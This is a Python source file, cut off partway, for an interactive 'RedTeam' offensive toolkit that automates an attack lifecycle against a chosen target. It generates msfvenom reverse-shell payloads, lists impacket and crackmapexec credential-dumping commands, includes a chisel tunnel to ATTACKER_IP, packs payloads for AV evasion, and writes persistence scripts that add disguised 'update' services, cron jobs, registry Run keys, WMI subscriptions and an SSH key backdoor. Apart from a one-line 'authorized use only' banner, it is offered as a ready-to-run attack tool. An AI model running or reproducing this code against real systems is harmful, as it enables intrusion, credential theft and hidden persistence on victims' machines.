"""
RedTeam Toolkit Interactive CLI
Main command-line interface for the offensive security toolkit
"""

import os
import sys
import subprocess
import shutil
import logging
import json
import threading
import time
import platform
import traceback
from pathlib import Path
from typing import Optional, List, Dict
from datetime import datetime
import hashlib

# Import configuration from subdirectory
TOOLKIT_DIR = Path(__file__).parent.absolute()
sys.path.insert(0, str(TOOLKIT_DIR / "configs"))

try:
    import config
except ImportError as e:
    print(f"❌ Error importing config: {e}")
    print(f"📁 Please ensure config.py exists in {TOOLKIT_DIR / 'configs'}")
    sys.exit(1)

# FIXED: Base class for script generation and phase handling
class ScriptGenerator:
    def __init__(self, loot_dir: Path):
        self.loot_dir = loot_dir

    def safe_write(self, filename: str, content: str, chmod_exec: bool = False):
        path = self.loot_dir / filename
        try:
            os.makedirs(self.loot_dir, exist_ok=True)
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            if chmod_exec:
                try:
                    path.chmod(0o755)
                except Exception:
                    pass
            return path
        except Exception as e:
            print(f"⚠️ [ScriptGenerator] Could not write {filename}: {e}")
            return None

class ToolExecutor:
    """Wrapper class to handle tool execution, logging, and output parsing"""
    def __init__(self, session_id: str, target: str, toolkit_dir: Path):
        self.session_id = session_id
        self.target = target
        self.toolkit_dir = toolkit_dir
        self.logs_dir = toolkit_dir / "logs" / session_id
        self.loot_dir = toolkit_dir / "loot" / target
        try:
            os.makedirs(self.logs_dir, exist_ok=True)
            os.makedirs(self.loot_dir, exist_ok=True)
        except Exception as e:
            print(f"⚠️ [ToolExecutor] Directory creation failed: {e}")
        self.logger = logging.getLogger(f"ToolExecutor_{session_id}")
        try:
            handler = logging.FileHandler(self.logs_dir / "execution.log", encoding='utf-8')
            handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            self.logger.addHandler(handler)
            self.logger.setLevel(logging.INFO)
        except Exception as e:
            print(f"⚠️ [ToolExecutor] Logging setup failed: {e}")

    def check_tool(self, tool_name: str) -> bool:
        return shutil.which(tool_name) is not None

    def execute_tool(self, tool_name: str, command: List[str], output_file: str = None, 
                    timeout: int = 300, capture_output: bool = True, dry_run: bool = False) -> Dict:
        if not self.check_tool(tool_name):
            return {
                "success": False,
                "error": f"Tool '{tool_name}' not found in PATH",
                "output": "",
                "command": " ".join(command)
            }
        if dry_run:
            print(f"[DRY-RUN] Would execute: {' '.join(command)}")
            return {
                "success": True,
                "output": "[DRY-RUN] No output.",
                "command": " ".join(command),
                "execution_time": 0,
                "output_file": output_file
            }
        try:
            start_time = time.time()
            result = subprocess.run(
                command,
                capture_output=capture_output,
                text=True,
                timeout=timeout,
                cwd=str(self.toolkit_dir),
                shell=False
            )
            output = (result.stdout or "") + (result.stderr or "")
            success = result.returncode == 0
            if output_file and output:
                try:
                    out_path = self.loot_dir / output_file
                    with open(out_path, 'w', encoding='utf-8') as f:
                        f.write(output)
                except Exception as e:
                    print(f"⚠️ [ToolExecutor] Could not save output file: {e}")
            exec_time = time.time() - start_time
            try:
                self.logger.info(f"Tool: {tool_name}, Command: {' '.join(command)}, Success: {success}, Time: {exec_time:.2f}s")
            except Exception:
                pass
            return {
                "success": success,
                "output": output,
                "command": " ".join(command),
                "execution_time": exec_time,
                "output_file": output_file
            }
        except subprocess.TimeoutExpired:
            err = f"Tool {tool_name} timed out after {timeout}s"
            try:
                self.logger.error(err)
            except Exception:
                pass
            return {
                "success": False,
                "error": err,
                "output": "",
                "command": " ".join(command)
            }
        except Exception as e:
            err = f"Error executing {tool_name}: {str(e)}\n{traceback.format_exc()}"
            try:
                self.logger.error(err)
            except Exception:
                pass
            return {
                "success": False,
                "error": err,
                "output": "",
                "command": " ".join(command)
            }

class RedTeamCLI:
    def __init__(self, dry_run=False, debug=False):
        try:
            self.toolkit_dir = TOOLKIT_DIR
            self.running = True
            self.current_session = None
            self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
            self.target = "example.com"
            self.logger = None
            self.tool_executor = None
            self.dry_run = dry_run
            self.debug = debug
            config.BASE_DIR = self.toolkit_dir
            self._ensure_directories()
            self._setup_logging()
            self.target = getattr(config, 'DEFAULT_TARGET', 'example.com')
            self.tool_executor = ToolExecutor(self.session_id, self.target, self.toolkit_dir)
            self.script_gen = ScriptGenerator(self.tool_executor.loot_dir)
            if self.logger:
                self.logger.info("RedTeam CLI initialized successfully")
        except Exception as e:
            print(f"❌ Error initializing CLI: {e}\n{traceback.format_exc()}")
            sys.exit(1)

    def _ensure_directories(self):
        for d in ["logs", "temp", "results", "loot", "ai_modules"]:
            try:
                os.makedirs(self.toolkit_dir / d, exist_ok=True)
            except Exception as e:
                print(f"⚠️ [RedTeamCLI] Directory creation failed: {e}")

    def _setup_logging(self):
        try:
            log_file = self.toolkit_dir / "logs" / "cli.log"
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler(log_file, encoding='utf-8'),
                    logging.StreamHandler()
                ]
            )
            self.logger = logging.getLogger(__name__)
        except Exception as e:
            print(f"⚠️ [RedTeamCLI] Logging setup failed: {e}")
            self.logger = None

    def print_colored(self, text: str, color: str = "WHITE", bold: bool = False, end: str = "\n"):
        try:
            colors = getattr(config, 'COLORS', {
                "RED": "\033[31m",
                "GREEN": "\033[32m", 
                "YELLOW": "\033[33m",
                "BLUE": "\033[34m",
                "MAGENTA": "\033[35m",
                "CYAN": "\033[36m",
                "WHITE": "\033[37m",
                "BOLD": "\033[1m",
                "RESET": "\033[0m"
            })
            color_code = colors.get(color.upper(), colors["WHITE"])
            bold_code = colors["BOLD"] if bold else ""
            reset_code = colors["RESET"]
            print(f"{bold_code}{color_code}{text}{reset_code}", end=end)
        except Exception:
            print(text, end=end)

    def print_banner(self):
        try:
            os.system('cls' if platform.system() == "Windows" else 'clear')
        except Exception:
            pass
        self.print_colored("=" * 60, "CYAN", True)
        self.print_colored("🔥 RedTeam AI-Assisted Offensive Security Toolkit", "CYAN", True)
        self.print_colored("=" * 60, "CYAN", True)
        self.print_colored("⚠️  For authorized penetration testing use only", "YELLOW")
        self.print_colored(f"📅 2024-2025 Edition | Current Target: {self.target}", "GREEN")
        self.print_colored("=" * 60, "CYAN")
        print()

    def show_main_menu(self):
        self.print_colored("🎯 Attack Lifecycle Menu:", "BLUE", True)
        print()
        menu_items = [
            ("1", "Reconnaissance", "🔍"),
            ("2", "Initial Access / Payload Generation", "💥"),
            ("3", "Privilege Escalation", "🔓"),
            ("4", "Credential Access / Lateral Movement", "🧠"),
            ("5", "Post-Exploitation / C2 / Pivoting", "📡"),
            ("6", "AV/EDR Evasion", "🦠"),
            ("7", "Persistence & Anti-Forensics", "👻"),
            ("8", "OPSEC & Anonymity Infrastructure", "🔒")
        ]
        for num, desc, emoji in menu_items:
            self.print_colored(f"  {emoji} {num}) {desc}", "GREEN")
        print()
        self.print_colored("🛠️  Toolkit Management:", "BLUE", True)
        self.print_colored(f"  ⚙️  9) Install/Update All Tools", "YELLOW")
        self.print_colored(f"  🔧 10) Configuration", "YELLOW") 
        self.print_colored(f"  🗑️ 11) Uninstall Toolkit", "RED")
        print()
        self.print_colored(f"  🚪 0) Exit", "RED")
        print()

    def get_user_choice(self, prompt: str = "Select an option") -> str:
        try:
            self.print_colored(f"{prompt} [0-11]: ", "CYAN", end="")
            return input().strip()
        except (KeyboardInterrupt, EOFError):
            return "0"
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error getting user input: {e}\n{traceback.format_exc()}")
            return ""

    def get_target_input(self) -> str:
        while True:
            self.print_colored("Enter target domain or IP address: ", "CYAN", end="")
            target = input().strip()
            if self.validate_target(target):
                return target
            else:
                self.print_colored("❌ Invalid target format. Please try again.", "RED")

    def validate_target(self, target: str) -> bool:
        if not target:
            return False
        import re
        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$'
        ip_pattern = r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
        return bool(re.match(domain_pattern, target) or re.match(ip_pattern, target))

    def run_recon(self, target: str):
        """Execute comprehensive reconnaissance phase - FIXED: Proper error handling and tool commands"""
        self.print_colored(f"🔍 Running Reconnaissance on target: {target}", "GREEN", True)
        print()
        
        # Update tool executor target - FIXED: Check if tool_executor exists
        if self.tool_executor:
            self.tool_executor.target = target
            self.tool_executor.loot_dir = self.toolkit_dir / "loot" / target
            try:
                self.tool_executor.loot_dir.mkdir(parents=True, exist_ok=True)
            except Exception as e:
                self.print_colored(f"⚠️ Warning: Cannot create loot directory: {e}", "YELLOW")
        
        # FIXED: Corrected command syntax and added proper file paths
        recon_tools = {
            "nmap": {
                "command": ["nmap", "-sV", "-sC", "-O", "--script", "vuln", 
                           "-oA", str(self.tool_executor.loot_dir / "nmap_scan"), target],
                "output_file": "nmap_results.txt",
                "description": "Comprehensive port scan with service detection"
            },
            "amass": {
                "command": ["amass", "enum", "-d", target, "-o", 
                           str(self.tool_executor.loot_dir / "amass_subdomains.txt")],
                "output_file": "amass_subdomains.txt",
                "description": "Subdomain enumeration"
            },
            "subfinder": {
                "command": ["subfinder", "-d", target, "-o", 
                           str(self.tool_executor.loot_dir / "subfinder_results.txt")],
                "output_file": "subfinder_results.txt", 
                "description": "Fast subdomain discovery"
            },
            "whatweb": {
                "command": ["whatweb", "-a", "3", "--log-brief", 
                           str(self.tool_executor.loot_dir / "whatweb_results.txt"), target],
                "output_file": "whatweb_results.txt",
                "description": "Web technology fingerprinting"
            },
            "httpx": {
                "command": ["httpx", "-u", target, "-title", "-tech-detect", "-status-code",
                           "-o", str(self.tool_executor.loot_dir / "httpx_results.txt")],
                "output_file": "httpx_results.txt",
                "description": "HTTP service probing"
            }
        }
        
        # FIXED: Check if wordlist exists before using gobuster
        wordlist_path = Path("/usr/share/wordlists/dirb/common.txt")
        if wordlist_path.exists():
            recon_tools["gobuster"] = {
                "command": ["gobuster", "dir", "-u", f"http://{target}", "-w", 
                           str(wordlist_path), "-o",
                           str(self.tool_executor.loot_dir / "gobuster_dirs.txt")],
                "output_file": "gobuster_dirs.txt",
                "description": "Directory and file bruteforcing"
            }
        
        results = {}
        
        for tool_name, tool_config in recon_tools.items():
            self.print_colored(f"🔧 Running {tool_name}: {tool_config['description']}", "BLUE")
            
            if self.tool_executor:
                result = self.tool_executor.execute_tool(
                    tool_name, 
                    tool_config["command"],
                    tool_config.get("output_file"),
                    timeout=600  # 10 minutes for recon tools
                )
                
                results[tool_name] = result
                
                if result["success"]:
                    self.print_colored(f"✅ {tool_name} completed successfully", "GREEN")
                    if result.get("output_file"):
                        self.print_colored(f"📁 Output saved to: loot/{target}/{result['output_file']}", "CYAN")
                else:
                    self.print_colored(f"❌ {tool_name} failed: {result.get('error', 'Unknown error')}", "RED")
            else:
                self.print_colored(f"❌ Tool executor not available", "RED")
            
            print()
        
        # Generate reconnaissance summary
        self._generate_recon_summary(target, results)

    def run_initial_access(self, target: str):
        """Execute initial access and payload generation phase - FIXED: Input validation and error handling"""
        self.print_colored(f"💥 Running Initial Access / Payload Generation for: {target}", "GREEN", True)
        print()
        
        try:
            # Get payload parameters with validation
            self.print_colored("Payload Configuration:", "BLUE")
            self.print_colored("Target OS (windows/linux): ", "CYAN", end="")
            target_os = input().strip().lower()
            
            if target_os not in ['windows', 'linux']:
                self.print_colored("⚠️ Invalid OS, defaulting to windows", "YELLOW")
                target_os = 'windows'
            
            self.print_colored("Listener IP: ", "CYAN", end="")
            lhost = input().strip() or getattr(config, 'DEFAULT_LHOST', '127.0.0.1')
            
            self.print_colored("Listener Port: ", "CYAN", end="")
            lport_input = input().strip()
            try:
                lport = int(lport_input) if lport_input.isdigit() else getattr(config, 'DEFAULT_LPORT', 4444)
                if not (1 <= lport <= 65535):
                    raise ValueError("Port out of range")
            except ValueError:
                lport = getattr(config, 'DEFAULT_LPORT', 4444)
                self.print_colored(f"⚠️ Invalid port, using default: {lport}", "YELLOW")
            
            print()
            
            # FIXED: Ensure loot directory exists and handle Path objects properly
            if self.tool_executor:
                try:
                    self.tool_executor.loot_dir.mkdir(parents=True, exist_ok=True)
                except Exception as e:
                    self.print_colored(f"⚠️ Warning: Cannot create loot directory: {e}", "YELLOW")
            
            # Payload generation tools - FIXED: Proper command construction
            payload_tools = {}
            
            if target_os == "windows":
                payload_tools = {
                    "msfvenom_exe": {
                        "command": ["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
                                   f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe",
                                   "-o", str(self.tool_executor.loot_dir / "payload.exe")],
                        "description": "Windows reverse TCP payload"
                    },
                    "msfvenom_ps": {
                        "command": ["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
                                   f"LHOST={lhost}", f"LPORT={lport}", "-f", "powershell"],
                        "description": "PowerShell payload",
                        "output_file": "payload.ps1"
                    }
                }
            else:  # linux
                payload_tools = {
                    "msfvenom_elf": {
                        "command": ["msfvenom", "-p", "linux/x64/meterpreter/reverse_tcp",
                                   f"LHOST={lhost}", f"LPORT={lport}", "-f", "elf",
                                   "-o", str(self.tool_executor.loot_dir / "payload")],
                        "description": "Linux reverse TCP payload"
                    },
                    "msfvenom_bash": {
                        "command": ["msfvenom", "-p", "cmd/unix/reverse_bash",
                                   f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw"],
                        "description": "Bash reverse shell",
                        "output_file": "reverse_bash.sh"
                    }
                }
            
            results = {}
            
            for tool_name, tool_config in payload_tools.items():
                self.print_colored(f"🔧 Generating {tool_config['description']}", "BLUE")
                
                if self.tool_executor:
                    result = self.tool_executor.execute_tool(
                        "msfvenom",  # FIXED: Use consistent tool name
                        tool_config["command"],
                        tool_config.get("output_file"),
                        timeout=120
                    )
                    
                    results[tool_name] = result
                    
                    if result["success"]:
                        self.print_colored(f"✅ {tool_config['description']} generated successfully", "GREEN")
                    else:
                        self.print_colored(f"❌ Failed to generate {tool_config['description']}: {result.get('error')}", "RED")
                else:
                    self.print_colored(f"❌ Tool executor not available", "RED")
                
                print()
            
            # Generate listener commands
            self._generate_listener_commands(lhost, lport, target_os)
            
        except (KeyboardInterrupt, EOFError):
            self.print_colored("\n❌ Operation cancelled", "YELLOW")
        except Exception as e:
            self.print_colored(f"❌ Error: {str(e)}", "RED")
            if self.logger:
                self.logger.error(f"Initial access error: {e}")

    def run_privilege_escalation(self, target: str):
        """Execute privilege escalation phase"""
        self.print_colored(f"🔓 Running Privilege Escalation for: {target}", "GREEN", True)
        print()
        
        self.print_colored("Select target OS:", "BLUE")
        self.print_colored("1) Linux", "GREEN")
        self.print_colored("2) Windows", "GREEN") 
        self.print_colored("OS [1-2]: ", "CYAN", end="")
        
        try:
            os_choice = input().strip()
            
            if os_choice == "1":
                # Linux privilege escalation
                linux_tools = {
                    "linpeas": {
                        "command": ["bash", str(self.toolkit_dir / "tools" / "linpeas.sh")],
                        "description": "Linux privilege escalation awesome script",
                        "download_url": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
                    },
                    "les": {
                        "command": ["bash", str(self.toolkit_dir / "tools" / "les.sh")],
                        "description": "Linux exploit suggester",
                        "download_url": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
                    }
                }
                
                # Download tools if not present
                for tool_name, tool_config in linux_tools.items():
                    tool_path = Path(tool_config["command"][1])
                    if not tool_path.exists():
                        self.print_colored(f"📥 Downloading {tool_name}...", "YELLOW")
                        try:
                            subprocess.run(["wget", "-O", str(tool_path), tool_config["download_url"]], 
                                         check=True, capture_output=True)
                            tool_path.chmod(0o755)
                            self.print_colored(f"✅ {tool_name} downloaded", "GREEN")
                        except:
                            self.print_colored(f"❌ Failed to download {tool_name}", "RED")
                            continue
                    
                    self.print_colored(f"🔧 Running {tool_config['description']}", "BLUE")
                    result = self.tool_executor.execute_tool(
                        "bash",
                        tool_config["command"],
                        f"{tool_name}_output.txt",
                        timeout=300
                    )
                    
                    if result["success"]:
                        self.print_colored(f"✅ {tool_name} completed", "GREEN")
                    else:
                        self.print_colored(f"❌ {tool_name} failed", "RED")
                    print()
                
            elif os_choice == "2":
                # Windows privilege escalation - FIXED: Generate proper PowerShell script
                self.print_colored("📋 Windows Privilege Escalation Tools:", "BLUE")
                print("  • Run winPEAS.exe on target")
                print("  • Check for unquoted service paths: wmic service get name,displayname,pathname,startmode")
                print("  • Check privileges: whoami /priv")
                print("  • Check for stored credentials: cmdkey /list")
                print("  • Check scheduled tasks: schtasks /query /fo LIST /v")
                
                # FIXED: Generate PowerShell privilege escalation script with proper syntax
                ps_content = r'''# Windows Privilege Escalation Checks
Write-Host "=== System Information ===" -ForegroundColor Cyan
systeminfo

Write-Host "=== Current User Privileges ===" -ForegroundColor Cyan  
whoami /priv

Write-Host "=== Stored Credentials ===" -ForegroundColor Cyan
cmdkey /list

Write-Host "=== Unquoted Service Paths ===" -ForegroundColor Cyan
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v """

Write-Host "=== Scheduled Tasks ===" -ForegroundColor Cyan
schtasks /query /fo LIST /v | findstr "Task To Run"

Write-Host "=== Weak Folder Permissions ===" -ForegroundColor Cyan
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
'''
                script_path = self.script_gen.safe_write("windows_privesc.ps1", ps_content)
                if script_path:
                    self.print_colored(f"📁 PowerShell script generated: {script_path}", "GREEN")
                
        except (KeyboardInterrupt, EOFError):
            self.print_colored("\n❌ Operation cancelled", "YELLOW")

    def run_credential_access(self, target: str):
        """Execute credential access and lateral movement phase"""
        self.print_colored(f"🧠 Running Credential Access / Lateral Movement for: {target}", "GREEN", True)
        print()
        
        # Credential access tools
        cred_tools = {
            "impacket_secretsdump": {
                "command": ["secretsdump.py", f"{target}/administrator", "-just-dc"],
                "description": "Extract domain credentials",
                "requires_creds": True
            },
            "impacket_wmiexec": {
                "command": ["wmiexec.py", f"administrator@{target}"],
                "description": "WMI command execution",
                "requires_creds": True
            },
            "impacket_psexec": {
                "command": ["psexec.py", f"administrator@{target}"],
                "description": "SMB command execution", 
                "requires_creds": True
            },
            "evil_winrm": {
                "command": ["evil-winrm", "-i", target, "-u", "administrator"],
                "description": "WinRM shell access",
                "requires_creds": True
            }
        }
        
        self.print_colored("📋 Credential Access Tools Available:", "BLUE")
        
        for tool_name, tool_config in cred_tools.items():
            if self.tool_executor.check_tool(tool_name.split('_')[0]):
                self.print_colored(f"✅ {tool_name}: {tool_config['description']}", "GREEN")
            else:
                self.print_colored(f"❌ {tool_name}: Not installed", "RED")
        
        print()
        self.print_colored("💡 Manual Commands for Credential Access:", "YELLOW")
        print(f"  • secretsdump.py DOMAIN/user:password@{target}")
        print(f"  • wmiexec.py DOMAIN/user:password@{target}")
        print(f"  • psexec.py DOMAIN/user:password@{target}")
        print(f"  • evil-winrm -i {target} -u user -p password")
        print(f"  • crackmapexec smb {target} -u user -p password --shares")
        print(f"  • crackmapexec smb {target} -u user -p password --sam")
        
        # Generate credential access scripts
        self._generate_lateral_movement_scripts(target)

    def run_post_exploitation(self, target: str):
        """Execute post-exploitation, C2, and pivoting phase"""
        self.print_colored(f"📡 Running Post-Exploitation / C2 for: {target}", "GREEN", True)
        print()
        
        # C2 and pivoting tools
        c2_tools = {
            "chisel": {
                "server_command": ["chisel", "server", "--reverse", "--port", "8080"],
                "client_command": ["chisel", "client", "ATTACKER_IP:8080", "R:1080:socks"],
                "description": "TCP tunnel for pivoting"
            },
            "socat": {
                "command": ["socat", "TCP-LISTEN:8081,fork", f"TCP:{target}:22"],
                "description": "Port forwarding relay"
            }
        }
        
        # Check for C2 frameworks
        c2_frameworks = ["sliver-server", "havoc", "metasploit"]
        
        self.print_colored("🌐 C2 Framework Status:", "BLUE")
        for framework in c2_frameworks:
            if self.tool_executor.check_tool(framework):
                self.print_colored(f"✅ {framework}: Available", "GREEN")
            else:
                self.print_colored(f"❌ {framework}: Not installed", "RED")
        
        print()
        
        # Generate C2 deployment scripts
        self._generate_c2_scripts(target)
        
        # Setup persistence
        self.print_colored("🔒 Setting up persistence mechanisms...", "BLUE")
        self._generate_persistence_scripts(target)

    def run_av_edr_evasion(self, target: str):
        """Execute AV/EDR evasion phase"""
        self.print_colored(f"🦠 Running AV/EDR Evasion for: {target}", "GREEN", True)
        print()
        
        evasion_tools = {
            "upx": {
                "command": ["upx", "--best", str(self.tool_executor.loot_dir / "payload.exe")],
                "description": "Executable packer"
            },
            "donut": {
                "command": ["donut", "-f", str(self.tool_executor.loot_dir / "payload.exe"),
                           "-o", str(self.tool_executor.loot_dir / "payload_donut.bin")],
                "description": "Shellcode generator"
            }
        }
        
        for tool_name, tool_config in evasion_tools.items():
            if self.tool_executor.check_tool(tool_name):
                self.print_colored(f"🔧 Running {tool_config['description']}", "BLUE")
                result = self.tool_executor.execute_tool(
                    tool_name,
                    tool_config["command"],
                    timeout=120
                )
                
                if result["success"]:
                    self.print_colored(f"✅ {tool_name} completed", "GREEN")
                else:
                    self.print_colored(f"❌ {tool_name} failed: {result.get('error')}", "RED")
            else:
                self.print_colored(f"❌ {tool_name} not available", "RED")
            print()
        
        # Generate evasion techniques
        self._generate_evasion_scripts()

    def run_persistence(self, target: str):
        """Execute persistence and anti-forensics phase"""
        self.print_colored(f"👻 Running Persistence & Anti-Forensics for: {target}", "GREEN", True)
        print()
        
        self.print_colored("Select target OS:", "BLUE")
        self.print_colored("1) Linux", "GREEN")
        self.print_colored("2) Windows", "GREEN")
        self.print_colored("OS [1-2]: ", "CYAN", end="")
        
        try:
            os_choice = input().strip()
            
            if os_choice == "1":
                linux_content = '''#!/bin/bash
# Linux Persistence Mechanisms

echo "*/5 * * * * /tmp/.update > /dev/null 2>&1" | crontab -
echo "/tmp/.update &" >> /etc/rc.local
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.update
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service
mkdir -p ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
echo "/tmp/.update &" >> ~/.bashrc
'''
                script_path = self.script_gen.safe_write("linux_persistence.sh", linux_content, chmod_exec=True)
                if script_path:
                    self.print_colored(f"📁 Linux persistence script: {script_path}", "GREEN")
            elif os_choice == "2":
                windows_content = r'''@echo off
REM Windows Persistence Mechanisms

REM Registry Run key persistence
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\System32\update.exe" /f

REM Scheduled task persistence
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\System32\update.exe" /sc onlogon /ru SYSTEM /f

REM Service persistence
sc create "WindowsUpdate" binpath= "C:\Windows\System32\update.exe" start= auto
sc start "WindowsUpdate"

REM Startup folder persistence
copy "update.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

REM WMI event subscription persistence
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
'''
                script_path = self.script_gen.safe_write("windows_persistence.bat", windows_content)
                if script_path:
                    self.print_colored(f"📁 Windows persistence script: {script_path}", "GREEN")
            self._generate_antiforensics_scripts()
        except Exception as e:
            self.print_colored(f"❌ Persistence phase error: {str(e)}", "RED")
            if self.logger:
                self.logger.error(f"Persistence error: {e}\n{traceback.format_exc()}")

    def install_update_tools(self):
        """Install or update all tools with improved error handling"""
        self.print_colored("⚙️ Installing/Updating All Tools", "GREEN", True)
        print()
        
        ai_toolkit = self.toolkit_dir / "ai_modules" / "toolkit_ai.py"
        if ai_toolkit.exists() and ai_toolkit.is_file():
            self.print_colored("🚀 Running full installation...", "BLUE")
            try:
                # Use Popen for real-time output
                process = subprocess.Popen([
                    sys.executable, str(ai_toolkit), "--full-install"
                ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                   universal_newlines=True, bufsize=1)
                
                # Print output in real-time
                for line in process.stdout:
                    print(line.rstrip())
                
                process.wait()
                
                if process.returncode == 0:
                    self.print_colored("✅ Installation completed successfully", "GREEN")
                else:
                    self.print_colored("❌ Installation failed", "RED")
                    
            except subprocess.TimeoutExpired:
                self.print_colored("⏱️ Installation timed out", "YELLOW")
            except Exception as e:
                self.print_colored(f"❌ Error: {str(e)}", "RED")
                if self.logger:
                    self.logger.error(f"Installation error: {e}")
        else:
            # Fallback installation
            installer_script = self.toolkit_dir / "install.sh"
            if installer_script.exists() and installer_script.is_file():
                self.print_colored("📦 Running installation script...", "BLUE")
                try:
                    result = subprocess.run(["/bin/bash", str(installer_script)], 
                                          timeout=3600, cwd=str(self.toolkit_dir))
                    if result.returncode == 0:
                        self.print_colored("✅ Installation completed", "GREEN")
                    else:
                        self.print_colored("❌ Installation failed", "RED")
                except FileNotFoundError:
                    self.print_colored("❌ Bash not found", "RED")
                except Exception as e:
                    self.print_colored(f"❌ Error: {str(e)}", "RED")
                    if self.logger:
                        self.logger.error(f"Script installation error: {e}")
            else:
                self.print_colored("❌ Installation script not found", "RED")

    def show_config_menu(self):
        """Display and manage configuration settings with improved error handling"""
        while True:
            try:
                os.system('cls' if platform.system() == "Windows" else 'clear')
            except:
                print("\n" * 20)  # Fallback clear
                
            self.print_colored("🔧 Configuration Menu", "BLUE", True)
            self.print_colored("=" * 40, "CYAN")
            print()
            
            # Display current configuration with safe attribute access
            self.print_colored("Current Settings:", "GREEN", True)
            print(f"  1) Use Tor: {getattr(config, 'USE_TOR', 'Unknown')}")
            print(f"  2) Use ProxyChains: {getattr(config, 'USE_PROXYCHAINS', 'Unknown')}")
            print(f"  3) Randomize User Agents: {getattr(config, 'RANDOMIZE_USER_AGENTS', 'Unknown')}")
            print(f"  4) Anti-Forensics: {getattr(config, 'ANTI_FORENSICS_ENABLED', 'Unknown')}")
            print(f"  5) ProtonMail Email: {getattr(config, 'PROTONMAIL_EMAIL', 'Unknown')}")
            print(f"  6) VPN Required: {getattr(config, 'VPN_REQUIRED', 'Unknown')}")
            print(f"  7) Default Target: {getattr(config, 'DEFAULT_TARGET', 'Unknown')}")
            print(f"  8) Default LHOST: {getattr(config, 'DEFAULT_LHOST', 'Unknown')}")
            print(f"  9) Default LPORT: {getattr(config, 'DEFAULT_LPORT', 'Unknown')}")
            print()
            self.print_colored(" 10) Save Configuration", "YELLOW")
            self.print_colored("  0) Back to Main Menu", "RED")
            print()
            
            choice = self.get_user_choice("Select setting to modify")
            
            try:
                if choice == "0":
                    break
                elif choice == "1":
                    config.USE_TOR = not getattr(config, 'USE_TOR', True)
                    self.print_colored(f"✅ Use Tor set to: {config.USE_TOR}", "GREEN")
                elif choice == "2":
                    config.USE_PROXYCHAINS = not getattr(config, 'USE_PROXYCHAINS', True)
                    self.print_colored(f"✅ Use ProxyChains set to: {config.USE_PROXYCHAINS}", "GREEN")
                elif choice == "3":
                    config.RANDOMIZE_USER_AGENTS = not getattr(config, 'RANDOMIZE_USER_AGENTS', True)
                    self.print_colored(f"✅ Randomize User Agents set to: {config.RANDOMIZE_USER_AGENTS}", "GREEN")
                elif choice == "4":
                    config.ANTI_FORENSICS_ENABLED = not getattr(config, 'ANTI_FORENSICS_ENABLED', True)
                    self.print_colored(f"✅ Anti-Forensics set to: {config.ANTI_FORENSICS_ENABLED}", "GREEN")
                elif choice == "5":
                    self.print_colored("Enter ProtonMail email: ", "CYAN", end="")
                    new_email = input().strip()
                    if "@" in new_email and "." in new_email:
                        config.PROTONMAIL_EMAIL = new_email
                        self.print_colored("✅ Email updated", "GREEN")
                    else:
                        self.print_colored("❌ Invalid email format", "RED")
                elif choice == "6":
                    config.VPN_REQUIRED = not getattr(config, 'VPN_REQUIRED', False)
                    self.print_colored(f"✅ VPN Required set to: {config.VPN_REQUIRED}", "GREEN")
                elif choice == "7":
                    self.print_colored("Enter default target: ", "CYAN", end="")
                    new_target = input().strip()
                    if self.validate_target(new_target):
                        config.DEFAULT_TARGET = new_target
                        self.target = new_target
                        self.print_colored("✅ Default target updated", "GREEN")
                    else:
                        self.print_colored("❌ Invalid target format", "RED")
                elif choice == "8":
                    self.print_colored("Enter default LHOST: ", "CYAN", end="")
                    new_lhost = input().strip()
                    if new_lhost:
                        config.DEFAULT_LHOST = new_lhost
                        self.print_colored("✅ Default LHOST updated", "GREEN")
                elif choice == "9":
                    self.print_colored("Enter default LPORT: ", "CYAN", end="")
                    new_lport = input().strip()
                    if new_lport.isdigit() and 1 <= int(new_lport) <= 65535:
                        config.DEFAULT_LPORT = int(new_lport)
                        self.print_colored("✅ Default LPORT updated", "GREEN")
                    else:
                        self.print_colored("❌ Invalid port number", "RED")
                elif choice == "10":
                    if hasattr(config, 'save_config'):
                        config.save_config()
                        self.print_colored("✅ Configuration saved", "GREEN")
                    else:
                        self.print_colored("❌ Save function not available", "RED")
                else:
                    self.print_colored("❌ Invalid choice", "RED")
                    
            except (KeyboardInterrupt, EOFError):
                self.print_colored("\n❌ Operation cancelled", "YELLOW")
                break
            except Exception as e:
                self.print_colored(f"❌ Configuration error: {str(e)}", "RED")
                if self.logger:
                    self.logger.error(f"Config menu error: {e}")
            
            if choice != "0":
                input("\nPress Enter to continue...")

    def continue_prompt(self) -> bool:
        """Ask user if they want to continue with another operation"""
        print()
        try:
            self.print_colored("Do you want to run another phase on the same target? (y/n): ", "CYAN", end="")
            choice = input().strip().lower()
            
            if choice == 'y':
                return True
            elif choice == 'n':
                return False
            else:
